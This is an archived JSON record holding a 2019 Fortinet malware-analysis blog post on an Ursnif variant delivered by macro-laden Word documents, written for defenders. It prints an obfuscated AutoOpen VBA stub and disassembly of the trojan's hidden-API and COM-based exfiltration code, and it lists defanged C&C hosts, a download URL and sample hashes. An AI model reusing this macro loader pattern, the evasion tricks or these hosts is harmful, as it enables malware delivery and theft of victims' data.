{
    "id": "5025a4aa-0a97-4cce-a1b8-0a3be8885572",
    "created_at": "2023-01-12T15:07:07.200909Z",
    "updated_at": "2025-03-27T02:05:56.568774Z",
    "deleted_at": null,
    "sha1_hash": "d70ae4804fb15935953910e8f7593ff3020a4ea8",
    "title": "2019-08-07 - New Ursnif Variant Spreading by Word Document",
    "authors": "",
    "file_creation_date": "2022-05-29T10:46:05Z",
    "file_modification_date": "2022-05-29T10:46:05Z",
    "file_size": 270801,
    "plain_text": "# New Ursnif Variant Spreading by Word Document\n\n**fortinet.com/blog/threat-research/ursnif-variant-spreading-word-document.html**\n\n_Breaking FortiGuard Labs Threat Research_\n\n\nAugust 7, 2019\n\n\n_NOTE: This threat is actively spreading. During my analysis, which started with just a few samples, the volume of captured samples and the_\n_number of triggers this new variant set off in our global network of sensors kept growing. Because of this, we highly recommend that_\n_organizations stay alert to this currently expanding threat._\n\nRecently, FortiGuard Labs captured a number of Word documents from the wild, which were spreading a new variant of the Ursnif trojan.\n\nI did some research on this new variant, and in this blog I will present what it does on a victim’s machine and what kinds of techniques it uses.\nUrsnif trojan, also known as Dreambot, Gozi, and ISFB, has been alive for years and focuses on stealing information from a victim’s machine.\n\n## Word Sample Analysis\n\nFigure 1. The Word sample content\n\nThese infected Word documents contain malicious VBA code. In this campaign, the file names of the Word documents are in the format:\n“info_[date].doc”. The sample in this analysis has the name info_07.25.doc.\n\nWhen a victim opens the Word document, it displays a security warning message designed to protect MS Word users from malicious macros\n(VBA code). However, the document content deceives victims to click the “Enable Content” button, as shown in Figure 1. When the button is\nclicked, the malicious VBA code is executed because the code is in an AutoOpen sub that is executed at opening the document.\n\nThe malicious code is simple, as shown below:\n\n_Sub AutoOpen()_\n\n_Set fPzzMCZTdBHCipC = ymwsrw_\n\n_Set KiVsBKglbMn = fPzzMCZTdBHCipC.Controls_\n\n_KKzPMDRPhZsJz = KiVsBKglbMn(2) + KiVsBKglbMn(0)_\n\n_Set PhFMwPKBcLcsm = VBA.GetObject(KiVsBKglbMn(100 - 90 - 9).Text)_\n\n\n-----\n\n_PhFMwPKBcLcsm.Run! KKzPMDRPhZsJz, 0 7596_\n\n_End Sub_\n\nMore code is read from three controls on the UserForm, named “ymwsrw”. It then puts PowerShell code from control’s text property together\nand executes it. The code is PowerShell code. I show the code in Figure 2, where you can see how the PowerShell code is transformed.\n\nFigure 2. Executing the PowerShell code\n\nThe first part is the original PowerShell code that the VBA code generates. As you can see, it is Base64 encoded (-Enc is short for EncodedCommand). After the code is Base64 decoded, the code is shown in the second part, which still contains Base64 encoded data. It\ncontinues to decode the data, then decompresses it to get the final PowerShell code in the bottom part of Figure 2.\n\nGoing through the final code, it then downloads a file from a URL (with a red underscore) into “$Env:UserProfile” folder and eventually starts it\nby calling “[Diagnostics.Process]::STaRt($UpwpWW)”. Of course, results may vary as these captured Word samples use many different URLs\nto download Ursnif.\n\nRegardless, the downloaded executable file is a variant of Ursnif and the Word document sample is an Ursnif Downloader.\n\n## Start Downloaded Ursnif\n\nBy checking the downloaded file, we learned that it had been compiled on July 25, 2019. When it starts, it dumps several dynamic codeth\nblocks into its memory and executes them. One among them is the main module that performs all Ursnif work.\n\nFigure 3. Extracted Ursnif Main module\n\nIn Figure 3, the data portion of the malware shows the file header of the decompressed Main module. It’s a little tricky here as it does not have\nDOS magic word “MZ” that should appear in the first red rectangle, nor the PE header magic word “PE” that should be in the second\nrectangle. Ursnif removed these magic words to prevent its being identified, but Ursnif knows how to load this module without them.\n\nIt continues to load every section from the PE structure into a newly allocated memory. It then repairs its relocation data and imports API\nfunctions contained in an import table. When everything is ready, it calls the OEP (Entry Point) of the main module. The process is just like\nwhat a packer does.\n\n## Anti-Analysis in Main Module of Ursnif\n\nUrsnif uses some anti-analysis techniques to make it harder for it to be analyzed. For example, it hides some API functions, which are parsed\ndynamically each time they are called so that static analysis is difficult; most data (in the “.bss” section of PE structure) in the main module is\nencrypted, and only gets decrypted at runtime. Let’s take a look at the details.\n\nUrsnif registers a vectored exception handler by calling the API RtlAddVectoredExceptionHandler, whose second parameter points to the\nhandler function. So, when it runs into any exception, the system will call this handler function first. Figure 4 shows the pseudo code for that.\n\nFigure 4. Register exception handler function\n\nUrsnif uses the exception handler function to decrypt the data in the “.bss” section. To do this, it modifies the memory-protection option for the\nmemory with the “.bss” section, where the encrypted data is in PAGE_NOACCESS (0x1). Therefore, when Ursnif reads data in this area, the\n**access violation exception (Exception Code C0000005) happens so that the exception handler function gets called.**\n\nFigure 5 is a screenshot of when Ursnif has just decrypted the data in the “.bss” section. This section’s size is 1000H. Most constant strings\nand API names are here, which are also used throughout Ursnif’s lifetime.\n\nFigure 5. Part of decrypted “.bss” data\n\nThere are a number of key APIs hidden in the main module. When it needs to call an API, it just needs to call a function named “API_Finder”\nto dynamically load the dll file that the API belongs to and find the API in it by calling LoadLibrary and then GetProcAddress.\n\nThe API names in the string are just from the decrypted “.bss” section in a structure with the strings and the offsets. “API_Finder” can locate\nthe API name by its offset. Here is the ASM code snippet when using API_Finder to get API “CloseClipboard” from “User32.dll”.\n\n000C9D27  sub_C9D27 proc near\n\n000C9D27  mov   eax, offset off_CC100\n\n000C9D2C  jmp   $+5\n\n000C9D31\n\n000C9D31 loc C9D31:\n\n\n-----\n\n000C9D31  push  ecx\n\n000C9D32  push  edx\n\n000C9D33  push  eax       ; API function index\n\n000C9D34  push  offset dword_CB2F4    ; dll name, 0CB150-> \"User32.dll\"\n\n000C9D39  call  API_Finder  ;It calls LoadLibrary and GetProcAddress. The API is in eax.\n\n000C9D3E  pop   edx\n\n000C9D3F  pop   ecx\n\n000C9D40  jmp   eax    ; calls the API function\n\n000C9D40 sub_C9D27 endp\n\n“API_Finder” obtains the API function index (It’s 0xCC100 here) from its second argument, from which the “API_Finder” can compute the\noffset of the string “CloseClipboard”. The first argument to “API_Finder” points to a structure with a library name. The entry point of\n“CloseClipboard” is returned in “eax”, which is called at last.\n\n## Using a COM Instance to Send Data to the C&C\n\nIf you keep an eye on the process list in Task Manager when Ursnif runs, you will find that there are many “iexplore.exe” processes that\nappear and disappear from time to time. And there is a lot of traffic out of “iexplorer.exe”. That is what Ursnif does to send out collected data\nfrom the victim’s system. It does not directly create the process “iexplorer.exe”, but COM (Component Object Model) does because Ursnif\ncreates a COM instance by calling API “CoCreateInstance”, which is a hidden API function. This is the ASM code snippet of calling it.\n\n[…]\n\nseg000:000C3E0B         jz   loc_C3E98\n\nseg000:000C3E11         push  esi\n\nseg000:000C3E12         push  offset rrid ; {EAB22AC1-30C1-11CF-A7EB-0000C05BAE0B}\n\nseg000:000C3E17         push  4    ; dwClsContext\n\nseg000:000C3E19         push  0    ; pUnkOuter\n\nseg000:000C3E1B         push  offset rclsid ; {0002DF01-0000-0000-C000-000000000046}\n\nseg000:000C3E20         call  ds:CoCreateInstance\n\nseg000:000C3E26         test  eax, eax\n\n[…]\n\nThe first argument is a GUID of “{0002DF01-0000-0000-C000-000000000046}”, which is the CLSID of “Internet Explorer”. The fourth\nargument is an interface ID, “{EAB22AC1-30C1-11CF-A7EB-0000C05BAE0B}”, which is an interface of “IWebBrowser”. The COM object can\nalso be created by the string ID “InternetExplorer.Application”.\n\n[The interface “IWebBrowser” implements a variety of methods to enable what you can do with the MS IE browser to access web sites such as](https://docs.microsoft.com/en-us/dotnet/api/shdocvw.iwebbrowser?view=dynamics-usd-3)\nGoBack(), GoHome(), Navigate(), Refresh(), and so on. COM starts “iexplorer.exe” and later loads the interface “IWebBrowser”, whose\nmethods then are ready to be called. Navigate() method is used by Ursnif to send collected data to its C&C server, whose first argument is a\nURL string.\n\nUrsnif has compressed configuration data in the “.reloc” section of the main module. Decompressing it extracts the data structure shown in\nFigure 6.\n\nFigure 6. Decompressed configuration data\n\nAt the bottom, you may notice the C&C host list includes \"microsoft.com\", \"update.microsoft.com\", \"avast.com\", \"cdevinoucathrine.info\",\n\"zcei60houston.club\" and \"kenovella.club\". This seems odd. Why are the hosts of “microsoft” and “avast” listed here? In fact, this is a way to\ndeceive researchers who capture and analyze the traffic.\n\nFigure 7. Format of collected information\n\n\n-----\n\nA snippet of code in Figure 7 allowes Ursnif to format the collected information from victim s system. One formatted string looks like this:\n\nsoft=3&version=214082&user=0364812000299edca18c7b9e8ed0ab6d&server=12&id=3387&crc=1&uptime=2193\n\n“soft” and “version” are constant.\n“user” is a sort of unique user ID. It consists of four DWORDs that were computed from a hash-code of the victim’s User Name and\nComputer Name, as well as its CPU ID.\n“server” and “id” are from the decompressed configuration data. They are behind the host strings, 3387 and 12, in Figure 6.\n“crc” is another constant of 1.\n“uptime” is a time value that tells the attacker the uptime since the victim’s system started.\n\nUrsnif encodes the above strings using Base64, which will then be a part of a URL. Other than that, it replaces several bytes with their hex\nstrings in the encoded string. (For example: “+” becomes “_2B”, “/” becomes “_2F”.) After that, it inserts a random number of “/” into it and\nadds a prefix “/images/” and suffix “.avi” to make the URL look normal.\n\nNow, the collected data is almost ready to be sent to its C&C server. As I said before, there are six host strings in the decompressed\nconfiguration. Ursnif picks one host string from them and makes a complete URL using the host and above encoded string. It will be the first\nargument of the method \"IWebBrowser.Navigate()\". It picks the next host string after a 20 second wait. Below is an example of a URL, which\nwill be sent to the C&C server.\n\nhxxps://cdevinoucathrine.info/images/SZmbQhNDM/NRU9kkrJ9pgbhJ0ElLjX/GmdR4KRmiqx7Vh8d_2B/e89HXjxRxOy7vuzb_2F1OA/xM3INQh\nD3eZsE/D_2Fiv5c/ju_2Bs3XEZzWGZSfnBvVAvj/9xxBpMO3_2/BGf9ybUt5cslyUgIK/_2BnKRHLrDUUyi44DVzf/T.avi\n\nThis is a host list of C&C servers that I extracted from two variants:\n\nhxxps://cdevinoucathrine.info\n\nhxxps://zcei60houston.club\n\nhxxps://kenovella.club\n\nhxxps://z76johnson.club\n\nhxxps://s75eagtyec.com\n\nhxxps://s97pe2360.club\n\nSo far, these are all of my findings for this Ursnif variant. I will continue to monitor this campaign for more details.\n\n## Solution:\n\nThis malicious Word document has been detected as “VBA/Agent.A329!tr.dldr” by the FortiGuard AntiVirus service. The CDR (Content\nDisarm & Reconstruction) feature in FortiGate and FortiMail can also neutralize this threat by removing all malicious VBA code.\n\nThe downloaded file has been detected as “W32/Ursnif.AHSY!tr” by the FortiGuard AntiVirus service.\n\nThe URL used to download Ursnif has been rated as “Malicious Websites” by the FortiGuard WebFilter service.\n\n## IoC:\n\n**URL:**\n\"hxxp://npkf32ymonica.com/sywo/fgoow.php?l=joow8.gxl\"\n\n**Sample SHA256:**\ninfo_07.25.doc:\n\nAAA7758D75967D28847B3CB8A9B3E3032F31EC45D12C9904A7BC98C189726005\n\nDownloaded executable file:\nAAC9D2D21F634157EB8D3867A2C72042A83CABC3F0142B12763312F5A0B0A83A\n\n_[Learn more about FortiGuard Labs and the FortiGuard Security Services portfolio.](https://www.fortinet.com/fortiguard/threat-intelligence/threat-research.html?utm_source=nreleaseblog&utm_campaign=2018-q2-fortiguardlabs-cta)_ _[Sign up for our weekly FortiGuard Threat Brief.](https://www.fortinet.com/fortiguard/threat-intelligence/threat-research.html?utm_source=nreleaseblog&utm_campaign=2018-q2-fortiguardlabs-cta)_\n\n_[Read about the FortiGuard Security Rating Service, which provides security audits and best practices.](https://www.fortinet.com/support-and-training/support-services/fortiguard-security-subscriptions/security-rating.html?utm_source=blog&utm_campaign=2018-blog-security-rating-service)_\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-08-07 - New Ursnif Variant Spreading by Word Document.pdf"
    ],
    "report_names": [
        "2019-08-07 - New Ursnif Variant Spreading by Word Document.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536027,
    "ts_updated_at": 1743041156,
    "ts_creation_date": 1653821165,
    "ts_modification_date": 1653821165,
    "files": {
        "pdf": "https://archive.orkl.eu/d70ae4804fb15935953910e8f7593ff3020a4ea8.pdf",
        "text": "https://archive.orkl.eu/d70ae4804fb15935953910e8f7593ff3020a4ea8.txt",
        "img": "https://archive.orkl.eu/d70ae4804fb15935953910e8f7593ff3020a4ea8.jpg"
    }
}